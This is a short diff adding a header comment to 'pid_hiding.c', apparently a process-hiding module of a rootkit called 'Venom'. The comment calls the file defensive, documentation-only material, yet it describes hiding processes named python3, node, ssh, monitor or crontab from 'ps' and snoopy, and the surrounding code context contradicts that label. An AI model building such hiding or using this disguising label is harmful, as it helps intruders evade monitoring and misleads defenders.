@@ -1,3 +1,20 @@
+/* 
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: pid_hiding.c
+ *
+ * Purpose:
+ *  - Documentation of observable process-hiding behaviors and indicators.
+ *    Describes differences between various process-enumeration approaches
+ *    and how defenders can triage mismatches.
+ *
+ * Contents (documentation-only):
+ *  - Hides listed processors from `ps auxf`, `snoopy` 
+ *  - Processors starting with `python3`, `python`, `node`, `ssh`, `monitor`, `crontab` will be hidden. These can be customized. 
+ */
+
+
+
 #ifndef PID_HIDING_H
 #define PID_HIDING_H
 
@@ -86,3 +103,4 @@ static void init_pid_hiding(void) {
 }
 
 #endif 
+
